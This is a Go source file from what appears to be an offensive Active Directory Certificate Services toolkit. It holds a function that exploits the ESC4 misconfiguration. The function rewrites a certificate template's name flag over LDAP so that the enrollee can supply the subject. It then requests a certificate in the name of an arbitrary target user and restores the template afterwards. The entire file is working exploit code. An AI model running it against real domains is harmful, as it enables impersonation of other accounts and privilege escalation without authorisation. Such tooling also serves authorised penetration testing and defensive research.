package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/go-ldap/ldap/v3"
)

type esc4State struct {
	TemplateDN   string `json:"template_dn"`
	OriginalFlag string `json:"original_flag"`
}

// ExploitESC4 exploits WriteDacl permissions on a template to make it ESC1-vulnerable, then exploits it.
func ExploitESC4(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC4 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	baseDN := buildCertTemplateBaseDN(cfg.Domain)
	filter := fmt.Sprintf("(&(objectClass=pKICertificateTemplate)(cn=%s))", ldap.EscapeFilter(templateName))

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter,
		[]string{"distinguishedName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return nil, nil, fmt.Errorf("template %q not found: %w", templateName, err)
	}

	templateDN := result.Entries[0].DN
	fmt.Printf("[+] Found template DN: %s\n", templateDN)

	originalFlag := result.Entries[0].GetAttributeValue("msPKI-Certificate-Name-Flag")
	if originalFlag == "" {
		originalFlag = "0"
	}

	stateFile := filepath.Join(".", "esc4_restore.json")

	// Check if a previous run crashed and left a lockfile
	if data, err := os.ReadFile(stateFile); err == nil {
		var state esc4State
		if json.Unmarshal(data, &state) == nil {
			if state.TemplateDN == templateDN && state.OriginalFlag != "1" {
				fmt.Println("[!] Found existing ESC4 lockfile. Attempting recovery before proceeding...")
				restoreReq := ldap.NewModifyRequest(state.TemplateDN, nil)
				restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{state.OriginalFlag})
				conn.Modify(restoreReq)
				os.Remove(stateFile)
				originalFlag = state.OriginalFlag
			}
		}
	}

	// Write lockfile
	stateData, _ := json.Marshal(esc4State{TemplateDN: templateDN, OriginalFlag: originalFlag})
	os.WriteFile(stateFile, stateData, 0600)

	// Step 2: Modify template
	fmt.Println("[*] Modifying template to enable ENROLLEE_SUPPLIES_SUBJECT...")
	modReq := ldap.NewModifyRequest(templateDN, nil)
	modReq.Replace("msPKI-Certificate-Name-Flag", []string{"1"}) // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
	if err := conn.Modify(modReq); err != nil {
		os.Remove(stateFile)
		return nil, nil, fmt.Errorf("modify template (need WriteDacl): %w", err)
	}
	fmt.Println("[+] Template modified — now ESC1 vulnerable")

	// Step 3: Exploit as ESC1
	cert, certKey, err := ExploitESC1(ctx, cfg, conn, templateName, targetUPN)
	if err != nil {
		restoreReq := ldap.NewModifyRequest(templateDN, nil)
		restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
		conn.Modify(restoreReq)
		os.Remove(stateFile)
		return nil, nil, fmt.Errorf("ESC1 exploitation after ESC4 modification: %w", err)
	}

	// Step 4: Restore original template configuration
	fmt.Println("[*] Restoring original template configuration...")
	restoreReq := ldap.NewModifyRequest(templateDN, nil)
	restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
	if err := conn.Modify(restoreReq); err != nil {
		fmt.Printf("[!] Warning: failed to restore template: %v\n", err)
	} else {
		fmt.Println("[+] Template restored to original state")
		os.Remove(stateFile)
	}

	return cert, certKey, nil
}
